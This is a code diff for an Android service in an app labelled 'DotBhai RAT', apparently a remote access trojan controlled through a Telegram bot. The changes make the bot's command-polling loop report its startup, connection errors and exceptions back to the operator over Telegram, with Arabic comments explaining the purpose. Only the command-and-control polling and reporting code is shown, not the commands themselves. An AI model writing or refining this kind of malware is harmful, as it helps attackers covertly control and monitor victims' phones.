@@ -41,7 +41,7 @@ public class BotCommandService extends Service {
             
             Notification notification = builder
                     .setContentTitle("DotBhai RAT")
-                    .setContentText("البوت شغال... أرسل /start")
+                    .setContentText("البوت شغال...")
                     .setSmallIcon(android.R.drawable.ic_menu_manage)
                     .build();
                     
@@ -55,6 +55,9 @@ public class BotCommandService extends Service {
     }
 
     private void pollLoop() {
+        // إرسال رسالة تأكيد إن الخدمة اشتغلت
+        TelegramSender.sendMessage("🔄 تم تشغيل محرك البوت بنجاح!");
+
         while (running) {
             try {
                 HttpUrl url = HttpUrl.parse(BASE + "/getUpdates").newBuilder()
@@ -63,7 +66,15 @@ public class BotCommandService extends Service {
                         .build();
                 Request req = new Request.Builder().url(url).get().build();
                 Response resp = TelegramSender.client.newCall(req).execute();
-                if (!resp.isSuccessful()) { resp.close(); Thread.sleep(3000); continue; }
+                
+                if (!resp.isSuccessful()) { 
+                    String err = resp.body().string();
+                    TelegramSender.sendMessage("⚠️ خطأ اتصال: " + err);
+                    resp.close(); 
+                    Thread.sleep(3000); 
+                    continue; 
+                }
+                
                 String body = resp.body().string();
                 resp.close();
 
@@ -93,7 +104,8 @@ public class BotCommandService extends Service {
                     }
                 }
             } catch (Exception e) {
-                Log.e("BotSvc", "poll: " + e.getMessage());
+                // إذا صار خطأ، بنرسله لك في تلجرام عشان نعرف السبب
+                TelegramSender.sendMessage("❌ خطأ برمجي: " + e.getMessage());
                 try { Thread.sleep(3000); } catch (Exception ignored) {}
             }
         }
